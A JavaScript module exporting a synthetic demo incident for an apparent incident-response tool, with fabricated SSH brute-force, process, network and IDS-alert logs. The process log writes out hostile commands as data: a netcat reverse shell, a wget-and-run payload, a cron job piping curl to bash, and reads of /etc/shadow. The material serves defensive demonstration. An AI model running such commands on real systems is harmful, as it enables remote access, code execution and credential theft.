// IncidentIQ — Sample Demo Incident (INC-1024)
// Realistic brute-force → account compromise → privilege escalation scenario

export const SAMPLE_INCIDENT = {
  name: 'Suspicious Server Activity',
  description: 'Automated demo scenario — SSH brute force leading to account compromise, privilege escalation, and suspicious outbound activity on prod-server-01.',
  files: [
    {
      name: 'auth.log',
      type: 'log',
      size: '4.2 KB',
      content: `Nov 15 22:08:14 prod-server-01 sshd[4821]: Failed password for invalid user admin from 203.0.113.45 port 52341 ssh2
Nov 15 22:08:16 prod-server-01 sshd[4822]: Failed password for invalid user admin from 203.0.113.45 port 52342 ssh2
Nov 15 22:08:18 prod-server-01 sshd[4823]: Failed password for invalid user root from 203.0.113.45 port 52343 ssh2
Nov 15 22:08:20 prod-server-01 sshd[4824]: Failed password for invalid user admin from 203.0.113.45 port 52344 ssh2
Nov 15 22:08:22 prod-server-01 sshd[4825]: Failed password for root from 203.0.113.45 port 52345 ssh2
Nov 15 22:08:24 prod-server-01 sshd[4826]: Failed password for root from 203.0.113.45 port 52346 ssh2
Nov 15 22:08:26 prod-server-01 sshd[4827]: Failed password for invalid user deploy from 203.0.113.45 port 52347 ssh2
Nov 15 22:08:28 prod-server-01 sshd[4828]: Failed password for invalid user deploy from 203.0.113.45 port 52348 ssh2
Nov 15 22:08:30 prod-server-01 sshd[4829]: Failed password for jsmith from 203.0.113.45 port 52349 ssh2
Nov 15 22:08:32 prod-server-01 sshd[4830]: Failed password for jsmith from 203.0.113.45 port 52350 ssh2
Nov 15 22:08:34 prod-server-01 sshd[4831]: Failed password for jsmith from 203.0.113.45 port 52351 ssh2
Nov 15 22:08:36 prod-server-01 sshd[4832]: Failed password for jsmith from 203.0.113.45 port 52352 ssh2
Nov 15 22:09:01 prod-server-01 sshd[4833]: Failed password for jsmith from 203.0.113.45 port 52360 ssh2
Nov 15 22:09:08 prod-server-01 sshd[4834]: Failed password for jsmith from 203.0.113.45 port 52361 ssh2
Nov 15 22:09:15 prod-server-01 sshd[4835]: Failed password for jsmith from 203.0.113.45 port 52362 ssh2
Nov 15 22:09:22 prod-server-01 sshd[4836]: Failed password for jsmith from 203.0.113.45 port 52363 ssh2
Nov 15 22:09:29 prod-server-01 sshd[4837]: Failed password for jsmith from 203.0.113.45 port 52364 ssh2
Nov 15 22:09:36 prod-server-01 sshd[4838]: Failed password for jsmith from 203.0.113.45 port 52365 ssh2
Nov 15 22:09:43 prod-server-01 sshd[4839]: Failed password for jsmith from 203.0.113.45 port 52366 ssh2
Nov 15 22:09:50 prod-server-01 sshd[4840]: Failed password for jsmith from 203.0.113.45 port 52367 ssh2
Nov 15 22:09:57 prod-server-01 sshd[4841]: Failed password for jsmith from 203.0.113.45 port 52368 ssh2
Nov 15 22:10:04 prod-server-01 sshd[4842]: Failed password for jsmith from 203.0.113.45 port 52369 ssh2
Nov 15 22:10:11 prod-server-01 sshd[4843]: Failed password for jsmith from 203.0.113.45 port 52370 ssh2
Nov 15 22:10:18 prod-server-01 sshd[4844]: Failed password for jsmith from 203.0.113.45 port 52371 ssh2
Nov 15 22:10:25 prod-server-01 sshd[4845]: Failed password for jsmith from 203.0.113.45 port 52372 ssh2
Nov 15 22:10:32 prod-server-01 sshd[4846]: Failed password for jsmith from 203.0.113.45 port 52373 ssh2
Nov 15 22:10:39 prod-server-01 sshd[4847]: Failed password for jsmith from 203.0.113.45 port 52374 ssh2
Nov 15 22:10:46 prod-server-01 sshd[4848]: Failed password for jsmith from 203.0.113.45 port 52375 ssh2
Nov 15 22:10:53 prod-server-01 sshd[4849]: Failed password for jsmith from 203.0.113.45 port 52376 ssh2
Nov 15 22:11:00 prod-server-01 sshd[4850]: Failed password for jsmith from 203.0.113.45 port 52377 ssh2
Nov 15 22:11:07 prod-server-01 sshd[4851]: Failed password for jsmith from 203.0.113.45 port 52378 ssh2
Nov 15 22:11:14 prod-server-01 sshd[4852]: Failed password for jsmith from 203.0.113.45 port 52379 ssh2
Nov 15 22:11:21 prod-server-01 sshd[4853]: Failed password for jsmith from 203.0.113.45 port 52380 ssh2
Nov 15 22:11:28 prod-server-01 sshd[4854]: Failed password for jsmith from 203.0.113.45 port 52381 ssh2
Nov 15 22:11:35 prod-server-01 sshd[4855]: Failed password for jsmith from 203.0.113.45 port 52382 ssh2
Nov 15 22:11:42 prod-server-01 sshd[4856]: Failed password for jsmith from 203.0.113.45 port 52383 ssh2
Nov 15 22:11:49 prod-server-01 sshd[4857]: Failed password for jsmith from 203.0.113.45 port 52384 ssh2
Nov 15 22:11:56 prod-server-01 sshd[4858]: Failed password for jsmith from 203.0.113.45 port 52385 ssh2
Nov 15 22:12:03 prod-server-01 sshd[4859]: Failed password for jsmith from 203.0.113.45 port 52386 ssh2
Nov 15 22:12:10 prod-server-01 sshd[4860]: Failed password for jsmith from 203.0.113.45 port 52387 ssh2
Nov 15 22:12:17 prod-server-01 sshd[4861]: Failed password for jsmith from 203.0.113.45 port 52388 ssh2
Nov 15 22:12:24 prod-server-01 sshd[4862]: Failed password for jsmith from 203.0.113.45 port 52389 ssh2
Nov 15 22:12:31 prod-server-01 sshd[4863]: Failed password for jsmith from 203.0.113.45 port 52390 ssh2
Nov 15 22:12:38 prod-server-01 sshd[4864]: Failed password for jsmith from 203.0.113.45 port 52391 ssh2
Nov 15 22:12:45 prod-server-01 sshd[4865]: Failed password for jsmith from 203.0.113.45 port 52392 ssh2
Nov 15 22:12:52 prod-server-01 sshd[4866]: Failed password for jsmith from 203.0.113.45 port 52393 ssh2
Nov 15 22:12:59 prod-server-01 sshd[4867]: Failed password for jsmith from 203.0.113.45 port 52394 ssh2
Nov 15 22:13:04 prod-server-01 sshd[4900]: Accepted password for jsmith from 203.0.113.45 port 52400 ssh2
Nov 15 22:13:04 prod-server-01 sshd[4900]: pam_unix(sshd:session): session opened for user jsmith by (uid=0)
Nov 15 22:13:05 prod-server-01 systemd-logind[901]: New session 142 of user jsmith.
`
    },
    {
      name: 'process.log',
      type: 'log',
      size: '2.1 KB',
      content: `Nov 15 22:13:10 prod-server-01 sudo[5001]: jsmith : TTY=pts/2 ; PWD=/home/jsmith ; USER=root ; COMMAND=/usr/bin/id
Nov 15 22:13:12 prod-server-01 sudo[5002]: pam_unix(sudo:session): session opened for user root by jsmith(uid=1001)
Nov 15 22:13:15 prod-server-01 sudo[5010]: jsmith : TTY=pts/2 ; PWD=/home/jsmith ; USER=root ; COMMAND=/bin/bash
Nov 15 22:13:15 prod-server-01 sudo[5010]: pam_unix(sudo:session): session opened for user root by jsmith(uid=1001)
Nov 15 22:13:22 prod-server-01 kernel: [5218340.921] audit: type=1400 audit(1731710002.921:890): apparmor="ALLOWED" operation="exec" profile="unconfined" name="/tmp/.x11-unix/run.sh" pid=5025 comm="bash"
Nov 15 22:13:22 prod-server-01 kernel: process exec: pid=5025 comm="run.sh" exe="/tmp/.x11-unix/run.sh"
Nov 15 22:13:24 prod-server-01 kernel: process exec: pid=5030 comm="nc" exe="/bin/nc" args="nc 185.234.219.18 4444 -e /bin/bash"
Nov 15 22:13:35 prod-server-01 kernel: process exec: pid=5045 comm="wget" exe="/usr/bin/wget" args="wget http://185.234.219.18/payload.sh -O /tmp/payload.sh"
Nov 15 22:14:02 prod-server-01 kernel: process exec: pid=5060 comm="bash" exe="/bin/bash" args="bash /tmp/payload.sh"
Nov 15 22:14:05 prod-server-01 cron[5070]: (root) CMD (curl -s http://185.234.219.18/beacon.sh | bash)
Nov 15 22:15:30 prod-server-01 sudo[5200]: jsmith : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/find / -name "*.conf" -readable
Nov 15 22:16:00 prod-server-01 sudo[5210]: jsmith : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cat /etc/shadow
Nov 15 22:16:10 prod-server-01 sudo[5220]: jsmith : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/tar -czf /tmp/configs.tar.gz /etc/
`
    },
    {
      name: 'network.log',
      type: 'log',
      size: '1.8 KB',
      content: `Nov 15 22:13:24 prod-server-01 kernel: [5218342.441] OUTBOUND_NEW: SRC=10.0.1.50 DST=185.234.219.18 PROTO=TCP SPT=49200 DPT=4444 STATE=NEW
Nov 15 22:13:24 prod-server-01 kernel: [5218342.441] OUTBOUND_ESTABLISHED: SRC=10.0.1.50 DST=185.234.219.18 PROTO=TCP SPT=49200 DPT=4444 STATE=ESTABLISHED
Nov 15 22:13:35 prod-server-01 kernel: [5218353.112] OUTBOUND_NEW: SRC=10.0.1.50 DST=185.234.219.18 PROTO=TCP SPT=49210 DPT=80 STATE=NEW
Nov 15 22:14:05 prod-server-01 kernel: [5218383.881] OUTBOUND_NEW: SRC=10.0.1.50 DST=185.234.219.18 PROTO=TCP SPT=49220 DPT=443 STATE=NEW
Nov 15 22:14:10 prod-server-01 kernel: [5218388.003] OUTBOUND_ESTABLISHED: SRC=10.0.1.50 DST=185.234.219.18 PROTO=TCP SPT=49220 DPT=443 STATE=ESTABLISHED
Nov 15 22:16:12 prod-server-01 kernel: [5218450.221] OUTBOUND_NEW: SRC=10.0.1.50 DST=185.234.219.18 PROTO=TCP SPT=49230 DPT=443 STATE=NEW
Nov 15 22:16:15 prod-server-01 kernel: [5218453.009] DATA_TRANSFER: SRC=10.0.1.50 DST=185.234.219.18 PROTO=TCP BYTES=248432 DURATION=180
Nov 15 22:08:00 prod-server-01 kernel: [5218018.001] INBOUND_REJECTED: SRC=203.0.113.45 DST=10.0.1.50 PROTO=TCP DPT=22 REJECT_REASON=rate_limit
Nov 15 22:08:05 prod-server-01 kernel: [5218023.002] INBOUND_ACCEPTED: SRC=203.0.113.45 DST=10.0.1.50 PROTO=TCP DPT=22 STATE=NEW
Nov 15 22:08:10 prod-server-01 kernel: [5218028.004] INBOUND_ACCEPTED: SRC=203.0.113.45 DST=10.0.1.50 PROTO=TCP DPT=22 STATE=NEW
`
    },
    {
      name: 'alerts.json',
      type: 'json',
      size: '3.1 KB',
      content: JSON.stringify([
        {
          alert_id: "IDS-8821",
          timestamp: "2026-11-15T22:08:00Z",
          rule: "SSH_BRUTE_FORCE",
          severity: "HIGH",
          source_ip: "203.0.113.45",
          destination_ip: "10.0.1.50",
          destination_port: 22,
          description: "SSH brute force attack detected. 47+ failed authentication attempts in under 5 minutes.",
          threshold: "10 failures/minute",
          action: "ALERT"
        },
        {
          alert_id: "IDS-8822",
          timestamp: "2026-11-15T22:13:04Z",
          rule: "SSH_LOGIN_AFTER_BRUTE_FORCE",
          severity: "CRITICAL",
          source_ip: "203.0.113.45",
          destination_ip: "10.0.1.50",
          destination_port: 22,
          user: "jsmith",
          description: "Successful SSH authentication following brute force activity from same source IP.",
          action: "ALERT"
        },
        {
          alert_id: "IDS-8823",
          timestamp: "2026-11-15T22:13:22Z",
          rule: "SUSPICIOUS_PROCESS_FROM_TMP",
          severity: "CRITICAL",
          host: "prod-server-01",
          pid: 5025,
          process: "/tmp/.x11-unix/run.sh",
          parent: "bash",
          description: "Process executed from /tmp directory with suspicious hidden path. Possible malware execution.",
          action: "ALERT"
        },
        {
          alert_id: "IDS-8824",
          timestamp: "2026-11-15T22:13:24Z",
          rule: "OUTBOUND_C2_SUSPECTED",
          severity: "CRITICAL",
          source_ip: "10.0.1.50",
          destination_ip: "185.234.219.18",
          destination_port: 4444,
          description: "Outbound connection to unusual port 4444 on external IP. Possible reverse shell or C2 channel.",
          geo_country: "Unknown",
          reputation: "Malicious",
          action: "ALERT"
        },
        {
          alert_id: "IDS-8825",
          timestamp: "2026-11-15T22:16:15Z",
          rule: "LARGE_DATA_TRANSFER_OUTBOUND",
          severity: "HIGH",
          source_ip: "10.0.1.50",
          destination_ip: "185.234.219.18",
          bytes_transferred: 248432,
          description: "Unusually large outbound data transfer (248 KB) to external IP flagged as suspicious.",
          action: "ALERT"
        }
      ], null, 2)
    }
  ]
}
